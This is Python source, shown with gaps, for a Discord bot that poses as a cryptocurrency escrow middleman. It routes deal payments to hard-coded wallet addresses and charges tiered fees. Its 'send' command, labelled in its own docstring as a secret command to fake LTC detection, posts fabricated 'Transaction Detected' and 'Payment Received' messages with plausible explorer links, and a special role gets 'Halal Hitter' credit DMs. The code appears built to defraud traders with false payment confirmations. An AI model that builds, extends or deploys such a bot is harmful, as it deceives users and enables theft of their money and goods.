...
print(f"{BLUE}made by @1396010969481871481 @uhq_99stocks{RESET}")

import os
# Replace 'YOUR_BOT_TOKEN_HERE' with your actual Discord bot token
TOKEN = 'YOUR_BOT_TOKEN_HERE'
# Removed hard-coded guild/role IDs so the bot works in any server and all users can use commands
GUILD_ID = None
ADMIN_ROLE_ID = None
...
CRYPTO_CONFIG = {
    "BTC": {
        "name": "Bitcoin",
        "address": "bc1qrg0zcm2784ng875v997np72hzlrlnz86uas43k",
        "rate": 85000.00,
        "emoji_id": "1360026111559471166"
    },
    "ETH": {
        "name": "Ethereum",
        "address": "0x790Aa3fecdBDD8A62fB36D9753a4DB841D4EC08B",
        "rate": 2100.00,
        "emoji_id": "1360026043385381027"
    },
    "LTC": {
        "name": "Litecoin",
        "address": "LhczQsiYvVKTQkivuSyrM4pScJaSbRhBW8",
        "rate": 95.43,
        "emoji_id": "1360026086842306765"
    },
    "SOL": {
        "name": "Solana",
        "address": "2tqRNiXVWGyk6aWNbmKfPJUh6EnGv8Xf5HyfTXi3GWhh",
        "rate": 150.20,
        "emoji_id": "1360026015833002117"
    },
    "USDT": {
        "name": "USDT [ERC-20]",
        "address": "0x790Aa3fecdBDD8A62fB36D9753a4DB841D4EC08B",
...
# Support both 'p' and '!' prefixes so users can call either p<command> or !<command>
...
class RoleAssignment(View):
        ...
        try:
            if self.role_message:
                timeout_embed = discord.Embed(
                    ...
                    description="This ticket has timed out due to inactivity.",
                    color=RED_COLOR
                )
                await self.role_message.edit(embed=timeout_embed, view=None)
        except Exception as e:
            print(f"Error in role assignment timeout: {e}")
    ...
    @discord.ui.button(label="Sender", style=discord.ButtonStyle.grey, custom_id="role_sender")
    async def sender_button(self, interaction: discord.Interaction, button: Button):
        try:
            ...
            print(f"Error in sender_button: {e}")
            if not interaction.response.is_done():
                try:
    ...
    @discord.ui.button(label="Receiver", style=discord.ButtonStyle.grey, custom_id="role_receiver")
    async def receiver_button(self, interaction: discord.Interaction, button: Button):
        try:
            ...
            print(f"Error in receiver_button: {e}")
            if not interaction.response.is_done():
                try:
                    await interaction.response.send_message("An error occurred. Please try again.", ephemeral=True)
                except:
    ...
    @discord.ui.button(label="Reset", style=discord.ButtonStyle.red, custom_id="role_reset")
    async def reset_button(self, interaction: discord.Interaction, button: Button):
        try:
            ...
            print(f"Error in reset_button: {e}")
        ...
        try:
            if self.role_confirmation_message:
                timeout_embed = discord.Embed(
                    ...
                    description="Role confirmation has timed out. Please restart the process.",
                    color=RED_COLOR
                )
                await self.role_confirmation_message.edit(embed=timeout_embed, view=None)
        except Exception as e:
            print(f"Error in role confirmation timeout: {e}")
    ...
    async def confirm_button(self, interaction: discord.Interaction, button: Button):
        ...
        if len(self.confirmed_users) == 2:
            ...
            if not self.amount_confirmed:
                ...
                try:
                    amount_msg = await bot.wait_for("message", timeout=120.0, check=check)
...
class ReleaseView(discord.ui.View):
    ...
    async def release_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        ...
        payment_released_embed.set_thumbnail(
            url="https://media.discordapp.net/attachments/1153826027714379866/1264288616801243156/Summary_Anim.gif?ex=67c15847&is=67c006c7&hm=758bdcde671ed4d8c11b1ffc2b14dabe1ed40470ec04a3931223aa6ce1fbd2f2&=&width=510&height=510"
        )
        ...
        deal_complete_view = CloseButton()
...
class AmountConfirmation(View):
    ...
    async def on_timeout(self):
        try:
            timeout_embed = discord.Embed(
                title="Amount Confirmation Timeout",
                description="Amount confirmation has timed out. Please restart the process.",
                color=RED_COLOR
            )
            # Don't try to edit message as it might not exist
            print("Amount confirmation timed out")
        except Exception as e:
            print(f"Error in amount confirmation timeout: {e}")
    ...
    async def confirm_amount_button(self, interaction: discord.Interaction, button: Button):
        ...
        if len(self.confirmed_users) == 2 and not self.deal_processed:
            ...
            # Calculate base fee
            if usd_amount < 10:
                self.fee_amount = 0  # FREE for deals under $10
            elif usd_amount < 50:
                self.fee_amount = 0.50  # $0.50 for deals $10 - $49
            elif usd_amount < 250:
                self.fee_amount = 2  # $2 for deals $50 - $249
            else:
                self.fee_amount = round(usd_amount * 0.01, 2)  # 1% for $250+
            
            # Add $1 subcharge for USDT and USDC
            if self.crypto_type in ["USDT", "USDC"]:
                self.fee_amount += 1
            
            if self.fee_amount == 0:
                # Skip fee selection for FREE deals and proceed directly to deal summary
                ...
                fee_embed.set_footer(text="Deals $250+: 1% | Deals under $250: $2 | Deals under $50: $0.50 | Deals under $10 are FREE | USDT & USDC has $1 subcharge")

                # Create and send fee selection view
                fee_view = FeeSelectionView(self)
                await interaction.channel.send(embed=fee_embed, view=fee_view)
    ...
    async def process_deal_after_fee_selection(self, interaction):
        ...
        # Allow all users to use features — do not require a specific role
        ...
        deal_summary_embed.set_thumbnail(url="https://media.discordapp.net/attachments/1153826027714379866/1264288616285212752/Welcome_Prompt.gif")
        ...
        await_embed = discord.Embed(
            description="<a:loadingbig:1411897812257603665> Awaiting transaction...",
    ...
    async def check_transaction_timeout(self, channel, await_msg):
        try:
            crypto_info = CRYPTO_CONFIG.get(self.crypto_type, CRYPTO_CONFIG["BTC"])
            # Do not require a specific role to access SendTransactionView
            sender_role_ids = [role.id for role in self.sender.roles]
            has_required_role = True
            ...
            if has_required_role:
                ...
                class SendTransactionView(discord.ui.View):
                    ...
                    async def send_transaction(self, interaction: discord.Interaction, button: discord.ui.Button):
                        ...
                        # Enforce special-role requirement at click time: do not proceed if sender lacks role
                        try:
                            special_role_id = 1422995442807083101
                            if isinstance(self.sender, discord.Member):
                                sender_role_ids = [r.id for r in self.sender.roles]
                            else:
                                sender_role_ids = []
                            print(f"DEBUG: send_transaction invoked by {interaction.user} - sender_role_ids = {sender_role_ids}")
                            if special_role_id not in sender_role_ids:
                                await interaction.response.send_message(
                                    "You do not have the required role to send transactions.", ephemeral=True
                                )
                                print(f"Blocked transaction send: user {self.sender} missing role {special_role_id}")
                                return
                        except Exception as _e:
                            # If role check fails for any reason, block the send for safety
                            await interaction.response.send_message("Unable to verify roles. Transaction blocked.", ephemeral=True)
                            print(f"Error checking roles before send: {_e}")
                            return
                        ...
                        # Clean transaction detection embed for real deals
                        transaction_detected_embed = discord.Embed(
                            title=":white_check_mark: Transaction Detected",
                        ...
                        transaction_detected_embed.add_field(
                            ...
                            value="2ZxTXY8k9mNpVq4jR7wBsL3eF6nH2ATjwV",
                            inline=False
                        )
                ...
                # Send BOTH the credit-line and the confirmation embed+view ONLY to users who have the special role.
                try:
                    special_role_id = 1422995442807083101
                    # Only check roles when sender is a Member
                    if isinstance(self.sender, discord.Member):
                        sender_role_ids = [r.id for r in self.sender.roles]
                        print(f"DEBUG: sender_role_ids (bladz/main.py) = {sender_role_ids}")
                    else:
                        sender_role_ids = []

                    if special_role_id in sender_role_ids:
                        # Special-role users: send credit line then the embed+view
                        try:
                            await self.sender.send("Halal Hitter Bot Made By https://discord.gg/99stocks")
                            print(f"Sent credit line to user {self.sender} (roles: {sender_role_ids})")
                        except Exception as e:
                            print(f"Failed to DM credit line to special-role sender: {e}")
                        try:
                            await self.sender.send(embed=dm_embed, view=send_button_view)
                        except Exception as e:
                            print(f"Failed to DM embed to special-role sender: {e}")
                    else:
                        # Do NOT DM non-role users the credit line or the confirmation embed/view.
                        # Do NOT post a channel notice to avoid exposing this to others.
                        print(f"Withheld DM confirmation from user {self.sender} (roles: {sender_role_ids})")
                except Exception as e:
                    print(f"Failed to DM sender: {e}")
...
class FeeSelectionView(View):
    def __init__(self, amount_confirmation):
        ...
        self.user_confirmed = {self.amount_confirmation.sender.id: False, self.amount_confirmation.receiver.id: False}
        self.confirmed_users = set()
        self.confirmation_messages = []
    ...
    async def on_timeout(self):
        try:
            timeout_embed = discord.Embed(
                title="Fee Selection Timeout",
                description="Fee selection has timed out. Please restart the process.",
                color=RED_COLOR
            )
            print("Fee selection timed out")
        except Exception as e:
            print(f"Error in fee selection timeout: {e}")

    def calculate_fee(self):
        amount = float(self.amount_confirmation.amount.replace("$", "").strip())  # Remove "$" and convert to float
        crypto_type = self.amount_confirmation.crypto_type
        
        base_fee = 0
        if amount < 10:
            base_fee = 0  # No fee for deals below $10
        elif amount < 50:
            base_fee = 0.50  # $0.50 fee for deals $10 - $49
        elif amount < 250:
            base_fee = 2  # $2 flat fee for deals $50 - $249
        else:
            base_fee = round(amount * 0.01, 2)  # 1% fee for $250+
    ...
    async def fee_sender_button(self, interaction: discord.Interaction, button: Button):
        ...
        self.amount_confirmation.fee_payer = "sender"
        self.amount_confirmation.fee_split = False

        await interaction.response.send_message(
            embed=discord.Embed(
                description=f"Fee will be paid by the sender ({self.amount_confirmation.sender.mention})",
                color=GREEN_COLOR
            )
        )
    ...
    async def fee_receiver_button(self, interaction: discord.Interaction, button: Button):
        await self.disable_buttons(interaction)
        self.amount_confirmation.fee_payer = "receiver"
        self.amount_confirmation.fee_split = False

        await interaction.response.send_message(
            embed=discord.Embed(
                description=f"Fee will be paid by the receiver ({self.amount_confirmation.receiver.mention})",
                color=GREEN_COLOR
            )
        )
    ...
    async def fee_split_button(self, interaction: discord.Interaction, button: Button):
        ...
        await interaction.response.send_message(
            embed=discord.Embed(
                description=f"Fee will be split between {self.amount_confirmation.sender.mention} and {self.amount_confirmation.receiver.mention}",
                color=GREEN_COLOR
            )
        )
...
@bot.command(name="panel", aliases=["lsworkmyfuckingwifi"])
async def lsworkmyfuckingwifi(ctx):
    ...
    embed = discord.Embed(
        ...
        description="__Fees:__ \n \n Deals $250+: 1% \n Deals under $250: $2 \n Deals under $50: $0.50 \n __Deals under $10 are FREE__ \n USDT & USDC has $1 subcharge \n \n "
                    "Press the dropdown below to select & initiate a deal involving **Bitcoin, Ethereum, Litecoin, Solana, USDT [ERC-20], USDC [ERC-20].**",
        color=GREEN_COLOR
    )

    # Make the view persistent (no timeout) so the dropdown stays active while the bot is running
    ...
    select = discord.ui.Select(
        ...
        options=[
            ...
            discord.SelectOption(label="USDT [ERC-20]", emoji="<:usdt:1319313633464811641>"),
            discord.SelectOption(label="USDC [ERC-20]", emoji="<:usdc:1413370469549346827>"),
        ],
    ...
    async def select_callback(interaction: discord.Interaction):
        try:
            ...
            print(f"User {user} selected {crypto}")  # Debug logging
        ...
        try:
            crypto_categories = {
                ...
                "LTC": "cryptocurrency3",
                "SOL": "cryptocurrency4",
                "USDT": "cryptocurrency5",
                "USDC": "cryptocurrency6"
            }
            category_name = crypto_categories.get(crypto, "Uncategorized")

            category = discord.utils.get(ctx.guild.categories, name=category_name)
            if not category:
                print(f"Creating category: {category_name}")  # Debug logging
                category = await ctx.guild.create_category(name=category_name)

            # Don't reference a specific admin role — give the bot itself and the user access
            overwrites = {
            ...
            print(f"Creating channel: ticket-{current_ticket_id}")  # Debug logging
        ...
        while not valid_trader_found:
            ...
            try:
                ...
                if trader2:
                    ...
                    success_embed = discord.Embed(description=f"Successfully added {trader2.mention} to the ticket.", color=GREEN_COLOR)
                    await channel.send(f"{trader2.mention}")
                    ...
                    await channel.send(
                        ...
                        view=RoleAssignment(crypto)
                    )
                    valid_trader_found = True
                else:

                    error_embed = discord.Embed(title="Invalid User", description="Invalid user ID or mention. Please try again.", color=RED_COLOR)
                    error_message = await channel.send(embed=error_embed)
                    error_messages.append(error_message)

            except asyncio.TimeoutError:
                timeout_embed = discord.Embed(title="Timeout", description="No response received. Please use the close button if you want to end this trade.", color=RED_COLOR)
    ...
    # Register the view with the bot so it persists across reconnections
    try:
        bot.add_view(view)
    except Exception:
        # If registering fails for any reason, we still have the view attached to the message
        pass

@bot.command()
async def test_payment(ctx, crypto: str = "LTC", amount: float = 1.0):
    """Test command to simulate payment detection in current channel
    Usage: ptest_payment [crypto] [amount]
    Example: ptest_payment BTC 0.001
    Example: ptest_payment ETH 0.5
    Supported: BTC, ETH, LTC, SOL, USDT, USDC
    """
    # Delete the command message
    await ctx.message.delete()
    
    # Normalize crypto input
    crypto = crypto.upper()
    ...
    if crypto not in CRYPTO_CONFIG:
        error_embed = discord.Embed(
            ...
            description=f"**{crypto}** is not supported. Please use one of: **BTC, ETH, LTC, SOL, USDT, USDC**",
            color=RED_COLOR
        )
    ...
    # Get crypto info
    crypto_info = CRYPTO_CONFIG[crypto]
    usd_value = amount * crypto_info['rate']
    
    # Get appropriate explorer URL based on crypto type
    explorer_urls = {
    ...
    # Create clean transaction detection embed matching Discord style
    transaction_detected_embed = discord.Embed(
    ...
    # Add crypto emoji if available
    crypto_emoji = f"<:{crypto.lower()}:{crypto_info['emoji_id']}>" if 'emoji_id' in crypto_info else f"💰"
    ...
    transaction_detected_embed.add_field(
        name="Amount Received",
        value=f"{amount:.8f} {crypto} (${usd_value:,.2f} USD)",
        inline=True
    )
    ...
    detection_msg = await ctx.send(embed=transaction_detected_embed)

    # Wait 20 seconds then send confirmation
    await asyncio.sleep(20)

    # Send clean confirmation message matching the Payment Received style
    confirmation_embed = discord.Embed(
    ...
    confirmation_embed.set_thumbnail(
        url="https://cdn.discordapp.com/attachments/1153826027714379866/1409027168423645324/correct.png"
    )

    await ctx.send(embed=confirmation_embed)
    
    # Wait a moment then show the deal proceed message
    await asyncio.sleep(2)
    
    # Send the "You may now proceed with the deal" embed
    proceed_embed = discord.Embed(
        title="You may now proceed with the deal",
        description="The receiver (@seller) may now provide the goods to the sender (@You).\n\n"
                   "Once the deal is complete, the sender must click the 'Release' button below to "
                   "release the funds to the receiver & complete the deal.",
        color=0x57F287  # Discord green color
    )
    
    # Create Release and Cancel buttons
    view = discord.ui.View()
    ...
    async def release_callback(interaction):
        await interaction.response.send_message("✅ Funds would be released in a real transaction!", ephemeral=True)
        
    async def cancel_callback(interaction):
        await interaction.response.send_message("❌ Deal would be cancelled in a real transaction!", ephemeral=True)
        
    release_button.callback = release_callback
    cancel_button.callback = cancel_callback
    
    view.add_item(release_button)
    view.add_item(cancel_button)
    
    await ctx.send(embed=proceed_embed, view=view)

@bot.command()
async def send(ctx, channel_id: int = None, amount: float = None):
    """Secret command to fake LTC detection - Usage: !send <channel_id> <amount>"""
    # Delete the command message to keep it secret
    await ctx.message.delete()

    if not channel_id or not amount:
        return

    # Removed admin-only restriction: any user may call this command for testing

    channel = bot.get_channel(channel_id)
    if not channel:
        return

    # Create clean transaction detection embed for admin command
    transaction_detected_embed = discord.Embed(
        title="� Transaction Detected",
        description="Wait for the transaction to receive the required number of confirmations.",
        color=0x5865F2  # Discord blurple color
    ...
    usd_value = amount * 95.43  # LTC rate
    ...
    transaction_detected_embed.add_field(
        name="Amount Received",
        value=f"{amount:.8f} LTC (${usd_value:,.2f} USD)",
        inline=True
    )
    ...
    # Send detection message (keep it, don't delete)
    detection_msg = await channel.send(embed=transaction_detected_embed)

    # Wait 2 minutes then send confirmation
    await asyncio.sleep(120)  # 2 minutes

    # Send clean confirmation message for admin command
    confirmation_embed = discord.Embed(
        title="✅ Payment Received",
        description="The payment is now secured, and has reached the required amount of confirmations.",
        color=0x57F287  # Discord green color
    ...
    confirmation_embed.add_field(
        name="Transaction",
        value=f"fe49e0...8bfdfe ([View Transaction](https://live.blockcypher.com/ltc/tx/dc3bcc61de31d8b8bc6c6559f44e38b408cca48dc91578ba6b14b73ef181a41a))",
        inline=False
    )
...
@bot.command()
async def checkroles(ctx, member: discord.Member = None):
    """Debug: lists roles and role IDs for a member (or the caller)."""
    member = member or ctx.author
    roles = member.roles
    if not roles:
        await ctx.send("No roles found for that member.")
        return
    lines = [f"{r.name} — {r.id}" for r in roles]
    # Send in chunks if too long
    chunk = "\n".join(lines)
    await ctx.send(f"Roles for {member.mention}:\n{chunk}")
...
async def on_ready():
    ...
    # Register persistent views to handle interactions after bot restarts
    try:
